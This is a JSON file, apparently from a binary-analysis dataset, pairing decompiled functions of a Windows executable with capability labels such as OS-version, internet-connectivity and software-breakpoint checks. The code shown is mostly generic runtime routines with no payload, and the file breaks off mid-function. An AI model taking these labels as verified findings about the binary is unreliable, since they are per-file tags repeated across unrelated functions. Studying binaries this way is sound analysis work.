{
    "00406144": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406144(uint *param_1)\n\n{\n    *param_1 = 0x401220;\n    if (param_1[2] != 0) {\n        fcn.00407d3b(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00406228": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00406228(uint param_1, uint32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    bool in_ZF;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    unkbyte10 in_ST0;\n    float10 fVar4;\n    uint unaff_retaddr;\n    uint32_t arg_8h;\n    \n    arg_8h = param_2 & 0xffff0000 | in_FPUControlWord;\n    if (in_ZF) {\n        if (((in_EAX & 0xfffff) == 0) && (param_3 == 0)) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = fcn.0040820c();\n        }\n        if (*0x7ff5c0 == 0) {\n            uVar3 = fcn.00408387(arg_8h, unaff_retaddr, param_3, param_4);\n            return CONCAT44(arg_8h, uVar3);\n        }\n    }\n    else {\n        fVar4 = fcos(in_ST0);\n        uVar1 = in_EAX & 0xffff0000 | in_FPUStatusWord;\n        if ((in_FPUStatusWord & 0x400) != 0) {\n            do {\n                fVar4 = fVar4 - (fVar4 / *0x401caa) * *0x401caa;\n                uVar1 = uVar1 & 0xffff0000 | in_FPUStatusWord;\n            } while ((in_FPUStatusWord & 0x400) != 0);\n            fcos(fVar4);\n        }\n        if (*0x7ff5c0 == 0) {\n            uVar2 = uVar1 & 0xffff0000 | in_FPUControlWord;\n            if (in_FPUControlWord != 0x27f) {\n                if (((in_FPUControlWord & 0x20) != 0) &&\n                   (uVar2 = uVar1 & 0xffff0000 | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0)) {\n                    uVar3 = fcn.00408387(arg_8h, unaff_retaddr, param_3, param_4);\n                    return CONCAT44(arg_8h, uVar3);\n                }\n                uVar2 = uVar2 & 0xffff0020;\n            }\n            return CONCAT44(arg_8h, uVar2);\n        }\n    }\n    return CONCAT44(arg_8h, uVar1);\n}\n",
        "token_count": 604
    },
    "00408dd3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00408ec6: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00408ecb)\n// WARNING: Removing unreachable block (ram,0x00408ef9)\n// WARNING: Removing unreachable block (ram,0x00408ed1)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408dd3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408f98(0x412388, 0x18);\n    fcn.0040b1b4(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x7ff600 != 1) {\n        *0x7ff5fc = 1;\n        *0x7ff5f8 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00407403(*0x9de5a8);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00407403(*0x9de5a4);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.004073fa();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00407403(*piVar2);\n                        iVar3 = fcn.004073fa();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00407403(*0x9de5a8);\n                        piVar1 = fcn.00407403(*0x9de5a4);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00408d0d(0x4011d8);\n        }\n        fcn.00408d0d(0x4011e0);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040b0da(8);\n    }\n    return;\n}\n",
        "token_count": 808
    },
    "0040b029": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b029(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x41493c) {\n        return;\n    }\n    *0x7ffe38 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x7ffe3c = &arg_8h;\n    *0x7ffd78 = 0x10001;\n    *0x7ffd20 = 0xc0000409;\n    *0x7ffd24 = 1;\n    var_328h = *0x41493c;\n    var_324h = *0x414940;\n    *0x7ffd2c = unaff_retaddr;\n    *0x7ffe04 = in_GS;\n    *0x7ffe08 = in_FS;\n    *0x7ffe0c = in_ES;\n    *0x7ffe10 = in_DS;\n    *0x7ffe14 = unaff_EDI;\n    *0x7ffe18 = unaff_ESI;\n    *0x7ffe1c = unaff_EBX;\n    *0x7ffe20 = in_EDX;\n    *0x7ffe24 = in_ECX;\n    *0x7ffe28 = in_EAX;\n    *0x7ffe2c = unaff_EBP;\n    *0x7ffe30 = unaff_retaddr;\n    *0x7ffe34 = in_CS;\n    *0x7ffe40 = in_SS;\n    *0x7ffd70 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b610(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x403598);\n    if (*0x7ffd70 == 0) {\n        fcn.0040b610(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 829
    },
    "0040deb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040deb8(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040b0da(0);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0040e327": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e327(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040e828;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x414cd8 - 1;\n        iVar4 = *0x414cd8 + (*0x414cd8 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x414cd8 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040e45c;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040e463;\ncode_r0x0040e45c:\n                        do {\n                            var_4h = 1;\ncode_r0x0040e463:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040e471;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040e471:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x414cd4 - *0x414cd8) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x414cd4 < iVar12) {\n                if (iVar12 < *0x414cd0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x414ce4;\n                    iVar4 = *0x414cdc + (*0x414cdc >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x414cdc & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x414cdc + (*0x414cdc >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x414cdc & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x414ce4 + *0x414cd0;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040e828;\n            }\n            var_10h = *0x414cd4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x414cd8 - 1;\n            iVar12 = *0x414cd8 + (*0x414cd8 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x414cd8 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040e614;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040e614:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x414cdc + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040e828:\n    var_20h = iVar12 << (0x1fU - *0x414cdc & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x414ce0 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x414ce0 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3632
    },
    "0040e86b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e86b(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040ed6c;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x414cf0 - 1;\n        iVar4 = *0x414cf0 + (*0x414cf0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x414cf0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040e9a0;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040e9a7;\ncode_r0x0040e9a0:\n                        do {\n                            var_4h = 1;\ncode_r0x0040e9a7:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040e9b5;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040e9b5:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x414cec - *0x414cf0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x414cec < iVar12) {\n                if (iVar12 < *0x414ce8) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x414cfc;\n                    iVar4 = *0x414cf4 + (*0x414cf4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x414cf4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x414cf4 + (*0x414cf4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x414cf4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x414cfc + *0x414ce8;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040ed6c;\n            }\n            var_10h = *0x414cec - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x414cf0 - 1;\n            iVar12 = *0x414cf0 + (*0x414cf0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x414cf0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040eb58;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 